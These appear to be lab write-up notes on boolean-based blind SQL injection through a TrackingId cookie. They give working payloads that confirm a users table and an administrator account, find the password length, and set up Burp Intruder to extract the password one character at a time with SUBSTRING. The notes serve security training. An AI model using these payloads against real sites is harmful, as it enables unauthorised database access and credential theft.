- This injection will be used in `Cookie` section in `TrackingID` input field of the page.

```
TrackingId=mCKLbQonMlRUp42B' AND '1'='1;  #Returns 'Welcome Back', This boolean condition means the page is vul to Bilnd SQLi
TrackingId=mCKLbQonMlRUp42B' AND '1'='2; #Doesn't Returns 'Welcome Back' 

TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users LIMIT 1)='a;  #Confirming that there is a table called users
TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users where username='administrator')='a; #confirming that there is a user called administrator

TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a #confirming that the password is greater than 1 character in length.
TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users where username='administrator' AND LENGTH(password)>19)='a; #Password is 20 char long
```


### After determining the length of the password, the next step is to `test the character at each position` to determine its value.
- This step involve `Intruder` Module, set the Type: Sniper, Position: $a$, Intruder Setting: Grep-Match 'Welcome Back'
- Injection: `TrackingId=mCKLbQonMlRUp42B' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='ยงaยง;`
- Repeat the same step for every position i.e SUBSTRING(password,2 to 20,1)
- On correct position guessed by payload, it'll flag the `Welcome Back` in result.
- Take the guessed char & note it down.

### Related Concepts: SUBSTRING(string, start_position, length)
```
string: The string from which you want to extract the substring.
start_position: The position in the string to start extracting (1-based index).
length: The number of characters to extract.
```
